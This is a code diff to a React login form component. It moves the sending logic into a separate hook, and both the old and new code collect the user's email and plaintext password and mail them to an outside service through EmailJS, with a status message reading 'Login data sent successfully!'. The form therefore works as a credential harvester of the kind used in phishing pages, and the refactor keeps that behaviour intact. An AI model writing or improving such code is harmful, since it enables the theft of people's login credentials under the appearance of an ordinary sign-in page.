@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import emailjs from '@emailjs/browser';
+import useSendEmail from './hooks/useSendEmail';
 import './LoginForm.css';
 
 interface TemplateParams extends Record<string, unknown> {
@@ -10,38 +10,23 @@ interface TemplateParams extends Record<string, unknown> {
 const LoginForm: React.FC = () => {
   const [email, setEmail] = useState<string>('');
   const [password, setPassword] = useState<string>('');
-  const [message, setMessage] = useState<string>('');
-  const [error, setError] = useState<string>('');
-  const [loading, setLoading] = useState<boolean>(false);
 
-  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
+  const { sendEmail, message, error, loading } = useSendEmail();
+
+  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
-    setLoading(true);
-    setMessage('');
-    setError('');
 
     const templateParams: TemplateParams = {
       user_email: email,
       user_password: password,
     };
-    
-    emailjs.send(
-      import.meta.env.VITE_EMAILJS_SERVICE_ID as string,
-      import.meta.env.VITE_EMAILJS_TEMPLATE_ID as string,
-      templateParams,
-      import.meta.env.VITE_EMAILJS_PUBLIC_KEY as string
-    )
-      .then((response) => {
-        console.log('SUCCESS!', response.status, response.text);
-        setMessage('Login data sent successfully!');
-        setEmail('');
-        setPassword('');
-      })
-      .catch((err) => {
-        console.error('FAILED...', err);
-        setError('Failed to send login data.');
-      })
-      .finally(() => setLoading(false));
+
+    const success = await sendEmail(templateParams);
+
+    if (success) {
+      setEmail('');
+      setPassword('');
+    }
   };
 
   return (
